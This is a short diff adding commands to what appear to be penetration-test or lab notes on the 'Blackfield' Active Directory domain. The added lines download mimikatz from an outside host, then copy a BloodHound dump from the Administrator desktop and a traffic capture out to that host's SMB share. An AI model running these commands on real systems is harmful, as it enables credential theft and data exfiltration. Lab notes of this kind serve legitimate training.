@@ -13,15 +13,15 @@ ldapsearch -H ldap://${ip} -b "DC=BLACKFIELD,DC=local" -D 'support@blackfield.lo
 ```
 
 ```
-
+Invoke-WebRequest http://192.168.45.186:80/mimikatz64.exe -OutFile mimikatz.exe
 ```
 
 ```
-
+copy C:\Users\Administrator\Desktop\20261119093321_BloodHound.zip \\192.168.45.186\share\
 ```
 
 ```
-
+copy traffic-capture-latest.pcapng \\192.168.45.186\share\
 ```
 
 ```
